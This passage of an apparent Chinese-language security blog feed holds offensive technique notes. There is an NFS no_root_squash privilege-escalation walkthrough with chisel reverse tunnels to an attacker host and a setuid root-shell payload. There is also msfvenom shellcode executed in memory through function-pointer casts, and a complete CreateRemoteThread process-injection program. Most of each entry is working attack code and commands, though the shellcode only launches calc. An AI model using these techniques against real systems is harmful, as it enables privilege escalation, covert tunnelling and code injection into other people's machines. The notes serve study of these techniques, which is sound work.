&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(e)<br>    sys.exit(<span class="hljs-number">0</span>)<br><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>信息安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BOF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NFS no_root_squash Remote Exploit Note</title>
    <link href="/2020/11/18/10_23_nfs_no_root_squash_remote_exploit/"/>
    <url>/2020/11/18/10_23_nfs_no_root_squash_remote_exploit/</url>
    
    <content type="html"><![CDATA[<p>NFS no_root_squash Remote Exploit (PrivEsc)</p><a id="more"></a><p>Port Scan</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">111</span>/tcp  open  rpcbind <span class="hljs-number">2</span>-<span class="hljs-number">4</span> (RPC #<span class="hljs-number">100000</span>)<br><span class="hljs-attribute">2049</span>/tcp open  nfs_acl <span class="hljs-number">3</span> (RPC #<span class="hljs-number">100227</span>)<br></code></pre></div></td></tr></table></figure><br/><p>Share Info(已登入到 Victim)</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># Victim</span><br><span class="hljs-comment"># /etc/exports</span><br><br>/srv/Share 10.1.1.0/24(insecure,rw)<br>/srv/Share 127.0.0.1/32(no_root_squash,insecure,rw)<br><br><br>-bash-4.2$ ll /share <br>drwxr-xr-x.  3 root root  19 Dec 21  2019 .   <br>dr-xr-xr-x. 17 root root 224 Dec 21  2019 .. <br>drwxrwxrwx.  2 root root   6 Dec 21  2019 Me<br><br>-bash-4.2$ ll /share/Me<br>drwxrwxrwx. 2 root root  6 Dec 21  2019 .<br>drwxr-xr-x. 3 root root 19 Dec 21  2019 ..<br></code></pre></div></td></tr></table></figure><br/><p>Reverse Socks5 Proxy</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># Attack</span><br>chisel server --host Attack -p 1234 --reverse<br><span class="hljs-comment"># 2020/11/17 21:25:41 server: Reverse tunnelling enabled</span><br><span class="hljs-comment"># 2020/11/17 21:25:41 server: Fingerprint aMM19G1w1a+3JHfkRi4oJAKMW/LTKQ9KCwDE7EYBGaE=</span><br><span class="hljs-comment"># 2020/11/17 21:25:41 server: Listening on http://Attack:1234</span><br><span class="hljs-comment"># 2020/11/17 21:27:38 server: session#2: tun: proxy#R:127.0.0.1:8888=&gt;socks: Listening</span><br><br><span class="hljs-comment"># Victim</span><br>chisel client Attack:1234 R:8888:socks<br><span class="hljs-comment"># 2020/11/17 08:27:35 client: Connecting to ws://Attack:1234</span><br><span class="hljs-comment"># 2020/11/17 08:27:37 client: Connected (Latency 229.064705ms)</span><br><br><span class="hljs-comment"># Attack</span><br><span class="hljs-comment"># Proxychains4.conf</span><br>socks5 127.0.0.1 8888<br></code></pre></div></td></tr></table></figure><p>Reverse Port forwarding</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># Attack</span><br>chisel server --host Attack -p 1234 --reverse<br><span class="hljs-comment"># 2020/11/17 21:37:11 server: session#3: tun: proxy#R:2049=&gt;2049: Listening</span><br><br><span class="hljs-comment"># Victim</span><br>chisel client Attack:1234 R:2049:127.0.0.1:2049<br></code></pre></div></td></tr></table></figure><br/><p>检查挂载信息</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">proxychains4 showmount -e Victim<br><br><span class="hljs-comment"># [proxychains] Strict chain  ...  127.0.0.1:8888  ...  Victim:111  ...  OK</span><br><span class="hljs-comment"># [proxychains] Strict chain  ...  127.0.0.1:8888  ...  Victim:20048  ...  OK</span><br><span class="hljs-comment"># Export list for Victim:</span><br><span class="hljs-comment"># /share/Me 127.0.0.1/32,Victim/24</span><br></code></pre></div></td></tr></table></figure><br/><p>Payload</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// gcc -o payload payload.c</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    setreuid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    system(<span class="hljs-string">&quot;/bin/bash&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>挂载 NFS Share 到 Attack</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># Attack</span><br><br>mount -t nfs 127.0.0.1:/share/Me /tmp/nfs<br></code></pre></div></td></tr></table></figure><p>复制到挂载目录并为 Payload 设置 SUID 权限</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># Attack</span><br><br>cp ./payload /tmp/nfs/bash<br>chmod +s /tmp/nfs/bash<br></code></pre></div></td></tr></table></figure><p>运行 Payload</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># Victim</span><br><span class="hljs-built_in">cd</span> /share/Me<br><br>./bash -p<br></code></pre></div></td></tr></table></figure><br/><h2 id="Links-amp-Resources"><a href="#Links-amp-Resources" class="headerlink" title="Links &amp; Resources"></a>Links &amp; Resources</h2><ul><li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe">NFS no_root_squash/no_all_squash misconfiguration PE</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>信息安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PrivEsc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Easy C Shellcode Execution</title>
    <link href="/2020/11/13/20_09_void_func_star/"/>
    <url>/2020/11/13/20_09_void_func_star/</url>
    
    <content type="html"><![CDATA[<p>What is <code>((void(*)())shellcode)() / int (*ret)() = (int(*)())buf;</code></p><a id="more"></a><p>code</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">// msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f c -v code</span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> code[] =<br><span class="hljs-string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52&quot;</span><br><span class="hljs-string">&quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;</span><br><span class="hljs-string">&quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;</span><br><span class="hljs-string">&quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;</span><br><span class="hljs-string">&quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;</span><br><span class="hljs-string">&quot;\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01&quot;</span><br><span class="hljs-string">&quot;\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48&quot;</span><br><span class="hljs-string">&quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0&quot;</span><br><span class="hljs-string">&quot;\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c&quot;</span><br><span class="hljs-string">&quot;\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0&quot;</span><br><span class="hljs-string">&quot;\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04&quot;</span><br><span class="hljs-string">&quot;\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59&quot;</span><br><span class="hljs-string">&quot;\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48&quot;</span><br><span class="hljs-string">&quot;\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00&quot;</span><br><span class="hljs-string">&quot;\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f&quot;</span><br><span class="hljs-string">&quot;\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff&quot;</span><br><span class="hljs-string">&quot;\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb&quot;</span><br><span class="hljs-string">&quot;\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c&quot;</span><br><span class="hljs-string">&quot;\x63\x2e\x65\x78\x65\x00&quot;</span>;<br><br><span class="hljs-keyword">void</span>* calc = VirtualAlloc(<span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span> code, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br><span class="hljs-built_in">memcpy</span>(calc, code, <span class="hljs-keyword">sizeof</span> code);<br>((<span class="hljs-keyword">void</span>(*)())calc)();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><br/><p>如下</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">((<span class="hljs-keyword">void</span> (*)()) calc)();<br><br>((<span class="hljs-keyword">void</span> (*)(<span class="hljs-keyword">void</span>)) calc)();    <span class="hljs-comment">// 不带参数(void)</span><br><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span> <span class="hljs-params">(*)</span><span class="hljs-params">()</span></span><br></code></pre></div></td></tr></table></figure><br/><p>将 calc 转换为一个指向函数的指针，该函数没有参数并返回 void，最后调用这个函数</p><ul><li><code>void(*)()</code> 是一个函数指针类型，该函数不返回任何内容(void)</li><li>末尾的 <code>()</code> 调用这个函数</li><li><code>(void(*)()) calc</code> 显式声明一个函数指针类型 <code>typedef void (*)()</code></li></ul><br/><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// /usr/src/metasploit-framework/data/templates/src/pe/exe/template.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCSIZE 4096</span><br><span class="hljs-keyword">char</span> payload[SCSIZE] = <span class="hljs-string">&quot;PAYLOAD:&quot;</span>;<br><br><span class="hljs-keyword">char</span> comment[<span class="hljs-number">512</span>] = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span> </span>&#123;<br>(*(<span class="hljs-keyword">void</span> (*)()) payload)();<br><span class="hljs-keyword">return</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><br/><p>另一种：<code>int (*ret)() = (int(*)())buf;</code></p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// shellcode</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> buf[] =<br>        <span class="hljs-string">&quot;\x48\x31\xc9\x48\x81\xe9\xfc\xff\xff\xff\x48\x8d\x05\xef\xff&quot;</span><br>        <span class="hljs-string">&quot;\xff\xff\x48\xbb\x95\xdb\xe9\x3a\xf5\xd2\xb2\x9b\x48\x31\x58&quot;</span><br>        <span class="hljs-string">&quot;\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xdd\xea\x3b\xd2\xf2\xd2&quot;</span><br>        <span class="hljs-string">&quot;\xb2\x9b\xe2\xb3\x86\x5b\x98\xbb\xb2\xc4\xc7\x8c\xa1\xb3\x13&quot;</span><br>        <span class="hljs-string">&quot;\x9a\x75\x5b\xae\xdb\xe9\x38\xfa\xd7\xb2\x9b&quot;</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Shellcode Length:  %d \n&quot;</span>, <span class="hljs-built_in">strlen</span>(buf));<br>    <span class="hljs-keyword">int</span> (*ret)() = (<span class="hljs-keyword">int</span>(*)())buf;<br>    ret();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>将 buf 转换为函数指针类型，并传递给同是函数指针的 ret，最后调用函数</p><br/><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">gcc -fno-stack-protector -z execstack -o shellcode shellcode.c<br></code></pre></div></td></tr></table></figure><br/><h2 id="Links-amp-Resources"><a href="#Links-amp-Resources" class="headerlink" title="Links &amp; Resources"></a>Links &amp; Resources</h2><ul><li><a href="https://news.ycombinator.com/item?id=11325163">Hacker News</a></li><li><a href="https://stackoverflow.com/questions/31420353/what-void-shellcode-means/31420363">what (<em>(void(</em>)()) shellcode)(); means?</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>信息安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>code execution</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Code Injection Demo</title>
    <link href="/2020/11/13/16_04_code_injection/"/>
    <url>/2020/11/13/16_04_code_injection/</url>
    
    <content type="html"><![CDATA[<p>Code Injection Demo</p><a id="more"></a><p>Function</p><ul><li><code>OpenProcess</code></li><li><code>VirtualAllocEx</code></li><li><code>WriteProcessMemory</code></li><li><code>CreateRemoteThread</code></li></ul><br/><h2 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h2><ul><li>使用 <code>OpenProcess</code> 函数获取对进程的访问权限</li><li>使用 <code>VirtualAllocEx</code> 函数在远程进程空间中分配一块内存</li><li>使用 <code>WriteProcessMemory</code> 函数将 shellcode 复制到分配的内存中</li><li>使用 <code>CreateRemoteThread</code> 函数在远程进程中创建一个线程，并传入第二步分配到的内存(shellcode)</li></ul><br/><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">(PWSTR)VirtualAllocEx(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span>(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE)<br><br>WriteProcessMemory(hProcess, remote_buffer, shellcode, <span class="hljs-keyword">sizeof</span>(shellcode), <span class="hljs-literal">NULL</span>)<br><br>CreateRemoteThread(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, remote_buffer, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>)<br></code></pre></div></td></tr></table></figure><br/><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><p>codeinjection.c</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tchar.h&gt;</span></span><br><br><br><span class="hljs-function">BOOL <span class="hljs-title">ShellCodeRemoteInjection</span><span class="hljs-params">(DWORD PID)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -b &quot;\x00&quot; -f c -v shellcode</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> shellcode[] =<br>        <span class="hljs-string">&quot;\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef\xff&quot;</span><br>        <span class="hljs-string">&quot;\xff\xff\x48\xbb\x0f\xd2\x5c\x69\xeb\xc9\xe0\xaa\x48\x31\x58&quot;</span><br>        <span class="hljs-string">&quot;\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xf3\x9a\xdf\x8d\x1b\x21&quot;</span><br>        <span class="hljs-string">&quot;\x20\xaa\x0f\xd2\x1d\x38\xaa\x99\xb2\xfb\x59\x9a\x6d\xbb\x8e&quot;</span><br>        <span class="hljs-string">&quot;\x81\x6b\xf8\x6f\x9a\xd7\x3b\xf3\x81\x6b\xf8\x2f\x9a\xd7\x1b&quot;</span><br>        <span class="hljs-string">&quot;\xbb\x81\xef\x1d\x45\x98\x11\x58\x22\x81\xd1\x6a\xa3\xee\x3d&quot;</span><br>        <span class="hljs-string">&quot;\x15\xe9\xe5\xc0\xeb\xce\x1b\x51\x28\xea\x08\x02\x47\x5d\x93&quot;</span><br>        <span class="hljs-string">&quot;\x0d\x21\x60\x9b\xc0\x21\x4d\xee\x14\x68\x3b\x42\x60\x22\x0f&quot;</span><br>        <span class="hljs-string">&quot;\xd2\x5c\x21\x6e\x09\x94\xcd\x47\xd3\x8c\x39\x60\x81\xf8\xee&quot;</span><br>        <span class="hljs-string">&quot;\x84\x92\x7c\x20\xea\x19\x03\xfc\x47\x2d\x95\x28\x60\xfd\x68&quot;</span><br>        <span class="hljs-string">&quot;\xe2\x0e\x04\x11\x58\x22\x81\xd1\x6a\xa3\x93\x9d\xa0\xe6\x88&quot;</span><br>        <span class="hljs-string">&quot;\xe1\x6b\x37\x32\x29\x98\xa7\xca\xac\x8e\x07\x97\x65\xb8\x9e&quot;</span><br>        <span class="hljs-string">&quot;\x11\xb8\xee\x84\x92\x78\x20\xea\x19\x86\xeb\x84\xde\x14\x2d&quot;</span><br>        <span class="hljs-string">&quot;\x60\x89\xfc\xe3\x0e\x02\x1d\xe2\xef\x41\xa8\xab\xdf\x93\x04&quot;</span><br>        <span class="hljs-string">&quot;\x28\xb3\x97\xb9\xf0\x4e\x8a\x1d\x30\xaa\x93\xa8\x29\xe3\xf2&quot;</span><br>        <span class="hljs-string">&quot;\x1d\x3b\x14\x29\xb8\xeb\x56\x88\x14\xe2\xf9\x20\xb7\x55\xf0&quot;</span><br>        <span class="hljs-string">&quot;\x2d\x01\x21\x51\xc8\xe0\xaa\x0f\xd2\x5c\x69\xeb\x81\x6d\x27&quot;</span><br>        <span class="hljs-string">&quot;\x0e\xd3\x5c\x69\xaa\x73\xd1\x21\x60\x55\xa3\xbc\x50\x29\xfd&quot;</span><br>        <span class="hljs-string">&quot;\x80\x05\x93\xe6\xcf\x7e\x74\x7d\x55\xda\x9a\xdf\xad\xc3\xf5&quot;</span><br>        <span class="hljs-string">&quot;\xe6\xd6\x05\x52\xa7\x89\x9e\xcc\x5b\xed\x1c\xa0\x33\x03\xeb&quot;</span><br>        <span class="hljs-string">&quot;\x90\xa1\x23\xd5\x2d\x89\x0a\x8a\xa5\x83\x84\x6a\xaa\x39\x69&quot;</span><br>        <span class="hljs-string">&quot;\xeb\xc9\xe0\xaa&quot;</span>;<br><br>BOOL status         = FALSE;<br>HANDLE hProcess     = <span class="hljs-literal">NULL</span>, hThread = <span class="hljs-literal">NULL</span>;<br>PWSTR remote_buffer = <span class="hljs-literal">NULL</span>;<br><br>    __try<br>    &#123;<br>        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);<br>        _tprintf(<span class="hljs-string">L&quot;Injecting DLL to PID: %lu \n&quot;</span>, PID);<br>        <span class="hljs-keyword">if</span> (hProcess == INVALID_HANDLE_VALUE)<br>        &#123;<br>            _tprintf(<span class="hljs-string">L&quot;Get Process Handle Error : %lu\n&quot;</span>, GetLastError());<br>            __leave;<br>        &#125;<br><br>        remote_buffer = (PWSTR)VirtualAllocEx(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span>(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br>        <span class="hljs-keyword">if</span> (!remote_buffer)<br>        &#123;<br>            _tprintf(<span class="hljs-string">L&quot;VirtualAlloc Error %lu \n&quot;</span>, GetLastError());<br>            __leave;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (!WriteProcessMemory(hProcess, remote_buffer, shellcode, <span class="hljs-keyword">sizeof</span>(shellcode), <span class="hljs-literal">NULL</span>))<br>        &#123;<br>            _tprintf(<span class="hljs-string">L&quot;WriteProcessMemory Error %lu \n&quot;</span>, GetLastError());<br>            __leave;<br>        &#125;<br><br>        hThread = CreateRemoteThread(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, remote_buffer, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">if</span> (hThread == <span class="hljs-literal">NULL</span>)<br>        &#123;<br>            _tprintf(<span class="hljs-string">L&quot;CreateRemoteThread Error %lu \n&quot;</span>, GetLastError());<br>            __leave;<br>        &#125;<br><br>        WaitForSingleObject(hThread, INFINITE);<br>        status = TRUE;<br>    &#125;<br>    __finally<br>    &#123;<br>        <span class="hljs-keyword">if</span> (remote_buffer != <span class="hljs-literal">NULL</span>)<br>            VirtualFreeEx(hProcess, remote_buffer, <span class="hljs-number">0</span>, MEM_RELEASE);<br>        <span class="hljs-keyword">if</span> (hThread != <span class="hljs-literal">NULL</span>)<br>            CloseHandle(hThread);<br>        <span class="hljs-keyword">if</span> (hProcess != <span class="hljs-literal">NULL</span>)<br>            CloseHandle(hProcess);<br>    &#125;<br>    <span class="hljs-keyword">return</span>(status);<br>&#125;<br><br><span class="hljs-keyword">int</span> _tmain(<span class="hljs-keyword">int</span> argc, TCHAR* argv[], TCHAR* envp[])<br>&#123;<br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>)<br>    &#123;<br>        _tprintf(<span class="hljs-string">L&quot;Usage: %s &lt;pid&gt; \n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (ShellCodeRemoteInjection((DWORD)_tstol(argv[<span class="hljs-number">1</span>])))<br>    &#123;<br>        _tprintf(<span class="hljs-string">L&quot;Shellcode Injection Sucess \n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        _tprintf(<span 